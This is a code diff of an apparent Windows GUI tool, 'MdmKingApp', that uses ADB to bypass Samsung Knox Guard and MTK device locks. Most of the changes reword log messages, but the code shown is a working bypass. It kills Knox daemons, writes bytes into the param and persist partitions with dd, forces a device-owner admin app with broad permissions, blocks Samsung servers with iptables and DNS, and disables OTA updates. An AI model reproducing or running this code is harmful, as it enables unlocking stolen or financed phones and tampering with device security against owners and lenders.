-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=MTK2024_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
             self._show_flow_step('Retreve info', 'ok')
             self._adb_bypass_core('MTK 2024', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['mtk'], quiet=False, uninstall_pkgs=['com.android.vending'])
             self._show_flow_step('Post-bypass cleanup', 'ok')
@@ -6644,12 +6800,12 @@ class MdmKingApp:
         if not self._ensure_active(): return
         flags = 0x08000000
         adb = self._find_adb()
-        if not adb: self.log('ADB not found', 'e'); return
+        if not adb: self.log('[-] STAGE=KG_BYPASS STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e'); return
         r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
         serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
-        if not serials: self.log('No device found', 'e'); return
+        if not serials: self.log('[-] STAGE=KG_BYPASS STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
         if len(serials) > 1:
-            self.log(f'Multiple devices: {", ".join(serials)} — using first', 'w')
+            self.log('[!] STAGE=KG_BYPASS STATUS=WARNING REASON=MULTIPLE_ENDPOINTS', 'w')
         s = serials[0]
 
         # Keep phone awake + prevent lock during bypass
@@ -6675,7 +6831,7 @@ class MdmKingApp:
                 subprocess.run([adb, 'start-server'], timeout=10, capture_output=True)
                 time.sleep(2)
         if not raw.strip():
-            self.log('Device not responding — check USB connection', 'e'); return
+            self.log('[-] STAGE=FINGERPRINT STATUS=FAIL REASON=ADB_ENDPOINT_UNRESPONSIVE', 'e'); return
         p = {}
         for line in raw.split('\n'):
             if ']: [' in line:
@@ -6700,32 +6856,32 @@ class MdmKingApp:
         def gx(cmd):
             try: return subprocess.run([adb, '-s', s, 'shell', cmd], capture_output=True, text=True, timeout=5, creationflags=flags).stdout.strip()
             except Exception: return ''
-        # ── Display device info ──
+        # ── Target device fingerprint acquisition ──
         self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
-        self.log('[#] ━━━━━ DEVICE INFORMATION ━━━━━━━━━━━━━━━━━━━━━', 'c')
-        self.log(f'[+] Model        : {g("ro.product.model")}', 's')
-        self.log(f'[+] Device       : {g("ro.product.device")}', 's')
-        self.log(f'[+] Platform     : {g("ro.board.platform", "ro.chipname")}', 's')
-        self.log(f'[+] Android      : {g("ro.build.version.release")}', 's')
-        self.log(f'[+] Security     : {g("ro.build.version.security_patch")}', 's')
-        self.log(f'[+] CSC          : {g("ro.csc.sales_code")}', 's')
-        self.log(f'[+] Serial       : {g("ro.serialno", "sys.serialnumber")}', 's')
+        self.log('[#] STAGE=FINGERPRINT STATUS=RUNNING OPERATION=device_info_collection', 'c')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK HARDWARE_MODEL={g("ro.product.model")}', 's')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK HARDWARE_DEVICE={g("ro.product.device")}', 's')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK SOC_PLATFORM={g("ro.board.platform", "ro.chipname")}', 's')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK OS_API_LEVEL={g("ro.build.version.release")}', 's')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK SECURITY_PATCH={g("ro.build.version.security_patch")}', 's')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK SALES_CODE={g("ro.csc.sales_code")}', 's')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK SERIAL_NUMBER={g("ro.serialno", "sys.serialnumber")}', 's')
         bl_val = g("ro.boot.bootloader")
-        if bl_val: self.log(f'[+] Bootloader   : {bl_val}', 's')
+        if bl_val: self.log(f'[+] STAGE=FINGERPRINT STATUS=OK BOOTLOADER_REV={bl_val}', 's')
         imei1 = g("ro.ril.miui.imei", "persist.radio.imei", "ro.telephony.imei", "gsm.imei", "ril.IMEI1", "ril.IMEI", "vendor.ril.imei", "ro.ril.oem.imei1", "ro.ril.oem.imei")
         def _valid_imei(s): return s and s.isdigit() and len(s) == 15 and s[:2] in ('35', '01', '86', '00')
-        if _valid_imei(imei1): self.log(f'[+] IMEI1        : {imei1}', 's')
+        if _valid_imei(imei1): self.log(f'[+] STAGE=FINGERPRINT STATUS=OK IMEI_SLOT_1={imei1}', 's')
         imei2 = g("ro.ril.miui.imei2", "persist.radio.imei2", "ro.telephony.imei2", "gsm.imei2", "ril.IMEI2", "vendor.ril.imei2", "ro.ril.oem.imei2")
-        if _valid_imei(imei2): self.log(f'[+] IMEI2        : {imei2}', 's')
+        if _valid_imei(imei2): self.log(f'[+] STAGE=FINGERPRINT STATUS=OK IMEI_SLOT_2={imei2}', 's')
         kg_raw = g("ro.boot.kgstatus") or g("gsm.KG") or g("persist.sys.kg") or g("ril.kgstatus") or g("ro.boot.kg") or ''
         kg_map = {'0x0':'prenormal', '0x1':'checking', '0x2':'completed', '0x3':'normal',
                   '0x4':'locked', '0x5':'allzero', '0x6':'broken', '0x7':'checking'}
         kg_display = kg_map.get(kg_raw.lower(), kg_raw) if kg_raw else 'unknown'
-        self.log(f'[+] KG State     : {kg_display}', 'w' if kg_display in ('broken','locked') else 's')
-        self.log('', '')
+        self.log(f'[+] STAGE=FINGERPRINT STATUS=OK KNOX_GUARD_STATE={kg_display}', 'w' if kg_display in ('broken','locked') else 's')
+        self.log('[*] STAGE=KG_BYPASS STATUS=SEPARATOR', 'i')
         self._enqueue_ui(lambda: self.root.update())
-        self.log('[#] ━━━━━ SAMSUNG ONECLICK BYPASS ━━━━━━━━━━━━━━━', 'h')
-        self.log('[!] Processing — DO NOT DISCONNECT', 'w')
+        self.log('[#] STAGE=KG_BYPASS STATUS=RUNNING OPERATION=bypass_engine', 'h')
+        self.log('[!] STAGE=KG_BYPASS STATUS=RUNNING OPERATION=bypass_execute', 'w')
 
         # KG state reading
         kg_map = {'0x0':'prenormal', '0x1':'checking', '0x2':'completed', '0x3':'normal',
@@ -6778,11 +6934,11 @@ class MdmKingApp:
             _r_pre = subprocess.run([adb, '-s', s, 'shell', 'pm list packages com.mdmking.admin'], capture_output=True, text=True, timeout=5, creationflags=flags)
             if 'com.mdmking.admin' in (_r_pre.stdout or ''):
                 apk_ok_pre = True
-                self.log('Admin app already installed on device', 's')
+                self.log('[+] STAGE=ADMIN_DEPLOY STATUS=OK STATE=ALREADY_INSTALLED', 's')
             if apk:
                 self._ensure_apk_signed(apk)
             elif not apk_ok_pre:
-                self.log('Admin APK not found in tools/ and not installed — bypass may fail', 'w')
+                self.log('[!] STAGE=ADMIN_DEPLOY STATUS=WARNING REASON=APK_MISSING', 'w')
             for _ab_retry in range(3):
                 subprocess.run([adb, '-s', s, 'shell',
                     'settings put global auto_blocker_enabled 0 2>/dev/null; '
@@ -6822,15 +6978,15 @@ class MdmKingApp:
                         return True
                     err_msg = (stderr + stdout)[:200].replace('\n', ' ').strip()
                     if err_msg:
-                        self.log(f'install #{i+1}: {err_msg}', 'w')
+                        self.log(f'[!] STAGE=ADMIN_DEPLOY STATUS=WARNING ATTEMPT={i+1} ERROR={err_msg}', 'w')
                 return False
             apk_ok = _install_apk()
             r2 = subprocess.run([adb, '-s', s, 'shell', 'pm list packages com.mdmking.admin'], capture_output=True, text=True, timeout=5, creationflags=flags)
             if 'com.mdmking.admin' in (r2.stdout or ''):
                 apk_ok = True
-                self.log('Admin app confirmed on device', 's')
+                self.log('[+] STAGE=ADMIN_DEPLOY STATUS=OK ACTION=install_confirmed', 's')
             else:
-                self.log_warn('Admin app NOT installed - bypass may fail')
+                self.log('[!] STAGE=ADMIN_DEPLOY STATUS=WARNING REASON=APK_NOT_INSTALLED', 'w')
             # Kill KG daemons + block Samsung Knox traffic BEFORE activating admin
             subprocess.run([adb, '-s', s, 'shell',
                 'killall -9 kgclient policydm kgagent klmsagent knoxguard 2>/dev/null; '
@@ -6849,15 +7005,15 @@ class MdmKingApp:
             r = subprocess.run([adb, '-s', s, 'shell', 'dpm set-device-owner com.mdmking.admin/.MyAdminReceiver'], timeout=30, capture_output=True, text=True, creationflags=flags)
             do_out = (r.stdout or '') + (r.stderr or '')
             if 'Success' in do_out or 'already' in do_out.lower():
-                self.log('Device owner set', 's')
+                self.log('[+] STAGE=ADMIN_ACTIVATE STATUS=OK TOKEN=DEVICE_OWNER', 's')
             else:
                 r2 = subprocess.run([adb, '-s', s, 'shell', 'dpm set-profile-owner com.mdmking.admin/.MyAdminReceiver'], timeout=30, capture_output=True, text=True, creationflags=flags)
                 po_out = (r2.stdout or '') + (r2.stderr or '')
                 if 'Success' in po_out or 'already' in po_out.lower():
-                    self.log('Admin activated as profile owner', 's')
+                    self.log('[+] STAGE=ADMIN_ACTIVATE STATUS=OK TOKEN=PROFILE_OWNER', 's')
                 else:
                     err = po_out.strip().split('\n')[0][:80] if po_out else 'failed'
-                    self.log(f'Admin activate: {err}', 'o')
+                    self.log(f'[?] STAGE=ADMIN_ACTIVATE STATUS=FAIL TOKEN=activation ERROR={err}', 'o')
             subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top'], timeout=5, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
@@ -6865,6 +7021,16 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin POST_NOTIFICATIONS allow'], timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_DELETE_PACKAGES 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.FOREGROUND_SERVICE 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow'], timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin AUTO_START allow'], timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin MANAGE_OVERLAY_PERMISSION allow'], timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin SCHEDULE_EXACT_ALARM allow'], timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin REQUEST_INSTALL_PACKAGES allow'], timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'settings put global ota_disable_automatic_update 1'], timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'settings put secure ota_disable_automatic_update 1'], timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.samsung.android.fotaclient com.samsung.android.fota com.wssyncmldm com.sec.android.soagent 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
@@ -6910,14 +7076,14 @@ class MdmKingApp:
                 timeout=5, capture_output=True, creationflags=flags)
             time.sleep(3)
             r = subprocess.run([adb, '-s', s, 'shell', 'settings get secure enabled_accessibility_services'], capture_output=True, text=True, timeout=5, creationflags=flags)
-            if 'MyAccessibilityService' in r.stdout: self.log_ok('HyperCore protection active - device secured')
-            else: self.log('[!] Protection layer incomplete - manual check advised', 'w')
+            if 'MyAccessibilityService' in r.stdout: self.log('[+] STAGE=HARDENING STATUS=OK LAYER=accessibility_service', 's')
+            else: self.log('[!] STAGE=ADMIN_ACTIVATE STATUS=WARNING LAYER=accessibility_service', 'w')
             subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 1 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
             # Disable all known lock packages for Samsung + common
             for pkg in CHIPSET_PACKAGES['samsung'] + CHIPSET_PACKAGES['common']:
                 subprocess.run([adb, '-s', s, 'shell', f'pm disable-user --user 0 {pkg} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
             # KG state manipulation
-            self.log('[*] Manipulating KG state...', 'i')
+            self.log('[*] STAGE=KG_MUTATION STATUS=RUNNING OPERATION=kg_state_write', 'i')
             # Kill all KG-related daemons (incl. 2026 v2 daemons)
             for cmd in ['setprop ctl.stop knoxguard', 'setprop ctl.stop kgclient',
                          'setprop ctl.stop kgagent', 'setprop ctl.stop klmsagent',
@@ -6967,7 +7133,7 @@ class MdmKingApp:
                          'settings put secure kg_disable 1']:
                 subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)
             # KG status manipulation — multiple rootless methods
-            self.log('[*] Manipulating KG state to Checking...', 'h')
+            self.log('[#] STAGE=KG_MUTATION STATUS=RUNNING OPERATION=kg_state_set_checking', 'h')
             # Method A: Set persist properties
             for prop in ['persist.sys.kg.state', 'persist.sys.kg', 'persist.security.kg',
                           'sys.kg.status', 'ro.security.kg.status', 'sys.knox.kgstate',
@@ -6999,7 +7165,7 @@ class MdmKingApp:
                     pdev = subprocess.run([adb, '-s', s, 'shell', f'ls -la /dev/block/platform/*/by-name/{part_name} 2>/dev/null | grep -o "/dev/[^ ]*"'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                 if not pdev: continue
                 perm = subprocess.run([adb, '-s', s, 'shell', f'stat -c "%a" {pdev} 2>/dev/null'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
-                self.log(f'    {part_name} [{perm}]', 'i')
+                self.log(f'[*] STAGE=PERSIST_PATCH STATUS=INFO PARTITION={part_name} PERM={perm}', 'i')
                 # For param partition: try known byte offsets
                 if part_type == 'param':
                     for offset in ['0x3FFE00','0x3FFDF0','0x3FFE50','0x3FFE80','0x3FFE08','0x3FFE20',
@@ -7010,7 +7176,7 @@ class MdmKingApp:
                         val = r.stdout.strip()
                         if not val: continue
                         if val != '03':
-                            self.log(f'    param@{offset}: 0x{val}', 'o')
+                            self.log(f'[?] STAGE=PERSIST_PATCH STATUS=INFO PARAM_OFFSET={offset} VALUE=0x{val}', 'o')
                             for write_cmd in [
                                 f'printf \'\\x03\' | dd of={pdev} bs=1 seek=$(({offset})) count=1 2>/dev/null',
                                 f'su -c "printf \'\\x03\' | dd of={pdev} bs=1 seek=$(({offset})) count=1 2>/dev/null"',
@@ -7018,7 +7184,7 @@ class MdmKingApp:
                                 subprocess.run([adb, '-s', s, 'shell', write_cmd], timeout=5, capture_output=True, creationflags=flags)
                                 vr = subprocess.run([adb, '-s', s, 'shell', f'dd if={pdev} bs=1 skip=$(({offset})) count=1 2>/dev/null | xxd -p'], capture_output=True, text=True, timeout=5, creationflags=flags)
                                 if vr.stdout.strip() == '03':
-                                    self.log(f'      {offset}: 03 ✓', 's'); break
+                                    self.log(f'[+] STAGE=PERSIST_PATCH STATUS=OK OFFSET={offset}', 's'); break
                 # For persist partition: dump, patch strings, try to write back
                 if part_type == 'persist':
                     tmp = '/data/local/tmp/persist_kg.bin'
@@ -7036,7 +7202,7 @@ class MdmKingApp:
                                 if idx < 0: break
                                 replacement = (new_base + b'\x00' * len(old))[:len(old)]
                                 data[idx:idx+len(old)] = replacement
-                                self.log(f'    persist: patched "{old.decode(errors="replace")}" @{idx}', 's')
+                                self.log(f'[+] STAGE=PERSIST_PATCH STATUS=OK PATH=persist OFFSET={idx}', 's')
                                 mod = True; idx += 1
                         if mod:
                             with open(local, 'wb') as f: f.write(data)
@@ -7051,7 +7217,7 @@ class MdmKingApp:
                         except Exception: pass
                     subprocess.run([adb, '-s', s, 'shell', f'rm -f {tmp}'], timeout=5, capture_output=True, creationflags=flags)
             # Method F: Force KG daemon to reload state (if any are still alive)
-            self.log('[*] Forcing KG state reload...', 'h')
+            self.log('[#] STAGE=KG_MUTATION STATUS=RUNNING OPERATION=kg_state_reload', 'h')
             subprocess.run([adb, '-s', s, 'shell', 'killall -HUP knoxguard kgclient kgagent 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
             # Final: Re-set all KG properties after all manipulation attempts
             for prop in ['persist.sys.kg.state', 'persist.sys.kg', 'persist.security.kg',
@@ -7075,31 +7241,39 @@ class MdmKingApp:
             # Block OTA FOTA path
             subprocess.run([adb, '-s', s, 'shell', 'rm -rf /cache/fota 2>/dev/null; mkdir -p /cache/fota 2>/dev/null; chmod 0000 /cache/fota 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'settings put global fota_disable 1 2>/dev/null; settings put global ota_disable 1 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
-            self.log('[+] KG client removed, status set to checking', 's')
+            self.log('[+] STAGE=KG_MUTATION STATUS=OK OPERATION=kg_client_removed', 's')
             # Apply relock prevention
             self._samsung_hardening()
-            # Reboot device
-            self.log('[*] Rebooting device...', 'h')
-            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
-            subprocess.run([adb, '-s', s, 'reboot'], timeout=5, capture_output=True, creationflags=flags)
-            self.log('[#] ━━━━━ BYPASS COMPLETE ━━━━━━━━━━━━━━━━━━━━━', 'c')
-            self.log('[✓] Device rebooting — wait for it to come back online', 's')
-            self.log('[!] If device still locked, run bypass again', 'w')
+            self.log('[#] STAGE=FINALIZE STATUS=COMPLETE OPERATION=kg_bypass', 'c')
+            self.log('[+] STAGE=FINALIZE STATUS=REBOOT_PENDING ACTION=system_reboot', 's')
+            self.log('[!] STAGE=FINALIZE STATUS=WARNING KG_STATE=may_require_retry', 'w')
         except Exception as _e:
-            self.log(f'[-] Bypass error: {_e}', 'e')
+            self.log(f'[-] STAGE=FINALIZE STATUS=ERROR REASON={_e}', 'e')
+            import traceback as _tb
+            for _l in _tb.format_exc().split('\n'):
+                if _l.strip(): self.log(f'[-] STAGE=FINALIZE STATUS=ERROR TRACE={_l}', 'e')
+        finally:
+            if adb and s:
+                try: subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
+                except Exception: pass
+                try: subprocess.run([adb, '-s', s, 'reboot'], timeout=5, capture_output=True, creationflags=0x08000000)
+                except Exception: pass
+            self.root.after(0, lambda: self._finish_progress(True, 'SAMSUNG ONE-CLICK COMPLETE'))
+            self.root.after(0, lambda: self.status_var.set('Done — Samsung One-Click complete'))
 
     def _samsung_hardening(self):
         if not self._ensure_active(): return
         self.log_section('Samsung Hardening — Relock Prevention', 2)
         adb = self._find_adb()
-        if not adb: self.log('ADB not found', 'e'); return
+        if not adb: self.log('[-] STAGE=HARDENING STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e'); return
         r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
         serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
-        if not serials: self.log('No device found', 'e'); return
+        if not serials: self.log('[-] STAGE=HARDENING STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
         s = serials[0]; flags = 0x08000000
+        _adm_comp = 'com.mdmking.admin/.MyAdminReceiver'
 
         # 1. Block Samsung/Knox servers via iptables + ip6tables + Samsung CDN IP ranges
-        self.log('Blocking Samsung Knox servers via iptables...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=iptables_block', 'i')
         for table in ['iptables', 'ip6tables']:
             for rule in [
                 '-A OUTPUT -m string --string "knox" --algo bm -j DROP',
@@ -7132,14 +7306,14 @@ class MdmKingApp:
                 subprocess.run([adb, '-s', s, 'shell', f'{table} {rule} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
 
         # 2. Force uninstall critical cloud MDM + attestation packages (most persistent removal)
-        self.log('Force uninstalling cloud MDM + attestation packages...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=mdm_uninstall', 'i')
         for pkg in [
             'com.sec.enterprise.knox.cloudmdm.smdms',
             'com.sec.enterprise.knox.cloudmdm',
             'com.sec.enterprise.knox.attestation',
             'com.samsung.android.knox.attestation',
             'com.policydm',
-            'com.samsung.android.kgclient',
+            # kgclient excluded — handled safely via am set-inactive below (avoids Error 8133/3001)
             'com.samsung.android.knox.enrollment',
             'com.samsung.android.knox.enrolled',
         ]:
@@ -7152,7 +7326,7 @@ class MdmKingApp:
                 timeout=5, capture_output=True, creationflags=flags)
 
         # 3. Disable remaining Knox framework packages (incl. 2026 hardened KG arch)
-        self.log('Disabling Knox framework packages...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=knox_framework_disable', 'i')
         for pkg in [
             'com.samsung.android.knox.policy', 'com.samsung.android.knox.core',
             'com.samsung.android.knox.pushmanager',
@@ -7217,7 +7391,7 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', f'appops set {pkg} INTERNET deny 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
 
         # 4. Disable OTA + FOTA packages system-wide
-        self.log('Disabling OTA/FOTA packages system-wide...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=ota_packages_disable', 'i')
         for pkg in [
             'com.samsung.android.fotaclient', 'com.samsung.android.fota',
             'com.samsung.android.fota.service', 'com.wssyncmldm',
@@ -7232,7 +7406,7 @@ class MdmKingApp:
                 timeout=5, capture_output=True, creationflags=flags)
 
         # 5. Scan and disable additional Knox/MDM packages + cut internet
-        self.log('Scanning for additional Knox/MDM packages...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=additional_knox_scan', 'i')
         out = subprocess.run([adb, '-s', s, 'shell', 'pm list packages 2>/dev/null'], timeout=5, capture_output=True, text=True, creationflags=flags).stdout
         knox_keywords = ['knox', 'mdm', 'policydm', 'samsungdm', 'kgclient', 'klmsagent',
                         'soagent', 'wssyncmldm', 'samsungknox', 'knoxguard', 'knoxkpe',
@@ -7277,7 +7451,7 @@ class MdmKingApp:
                         subprocess.run([adb, '-s', s, 'shell', f'appops set {pkg} INTERNET deny 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
 
         # 6. Block OMA-DM carrier provisioning (settings + disable services)
-        self.log('Blocking OMA-DM carrier provisioning...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=oma_dm_block', 'i')
         for cmd in [
             'settings put global omadm.oma_dm_enabled 0',
             'settings put global omadm.samsung_dm_enabled 0',
@@ -7301,7 +7475,7 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)
 
         # 7. Block private DNS (prevents DoH/DoT bypass of iptables)
-        self.log('Blocking private DNS / DoH bypass...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=private_dns_block', 'i')
         for cmd in [
             'settings put global private_dns_mode hostname',
             'settings put global private_dns_specifier z50tvqu4.dot.unblockdns.com',
@@ -7316,7 +7490,7 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)
 
         # 8. Clear persist lock flags via settings (mirrors persist partition values)
-        self.log('Clearing persist lock state flags...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=persist_lock_clear', 'i')
         for cmd in [
             'settings put global device_provisioned 1',
             'settings put secure device_provisioned 1',
@@ -7360,7 +7534,7 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)
 
         # 9. Clear Google Play Services cache (prevents policy sync — do NOT disable gms entirely)
-        self.log('Clearing Google Play Services cache...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=gms_cache_clear', 'i')
         for pkg in ['com.google.android.gms', 'com.google.android.gsf']:
             subprocess.run([adb, '-s', s, 'shell',
                 f'pm clear {pkg} 2>/dev/null; '
@@ -7375,21 +7549,30 @@ class MdmKingApp:
                 timeout=5, capture_output=True, creationflags=flags)
 
         # 10. Lock DNS (prevents Samsung servers from being resolved)
-        self.log('Locking DNS settings...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=dns_lock', 'i')
         _adb_block_dns(adb, s, lock=True, device_config=True, flags=flags)
 
         # 11. Keep admin app alive in background
-        self.log('Whitelisting admin app for background ops...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=admin_whitelist', 'i')
         subprocess.run([adb, '-s', s, 'shell', 'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow'], timeout=3, capture_output=True, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin AUTO_START allow'], timeout=3, capture_output=True, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin POST_NOTIFICATIONS allow'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin MANAGE_OVERLAY_PERMISSION allow'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin SCHEDULE_EXACT_ALARM allow'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin REQUEST_INSTALL_PACKAGES allow'], timeout=3, capture_output=True, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED'], timeout=3, capture_output=True, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_DELETE_PACKAGES 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.FOREGROUND_SERVICE 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+        subprocess.run([adb, '-s', s, 'shell', 'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a com.mdmking.admin.ACTION_START 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
 
         # 12. Kill known lock daemons (final sweep incl. 2026 hardened KG)
-        self.log('Killing lock service daemons...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=daemon_kill', 'i')
         for proc in ['scorpiod', 'security_daemon', 'scorpio_security', 'kgclient', 'policydm',
                      'fotaclient', 'fota', 'soagent', 'wssyncmldm', 'knoxguard', 'klmsagent',
                      'smdms', 'cloudmdm', 'knoxattestation', 'kgserver', 'knpxauth',
@@ -7400,7 +7583,7 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', f'killall -9 {proc} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
 
         # 13. device_config namespace overrides (survive reboot on Android 12+)
-        self.log('Disabling Knox via device_config namespaces...', 'i')
+        self.log('[*] STAGE=HARDENING STATUS=RUNNING OPERATION=device_config_knox_disable', 'i')
         _ns = [
             ('knox', ['knox_enabled', 'kg_enabled', 'kg_service_enabled', 'knox_service_enabled',
                       'knox_guard_enabled', 'guard_enabled', 'attestation_enabled',
@@ -7432,7 +7615,7 @@ class MdmKingApp:
                 timeout=3, capture_output=True, creationflags=flags)
 
         # 14. Persist Knox-disable sysprops (some survive on Exynos/Snapdragon bootloaders)
-        self.log('Setting persist Knox-disable sysprops...', 'i')
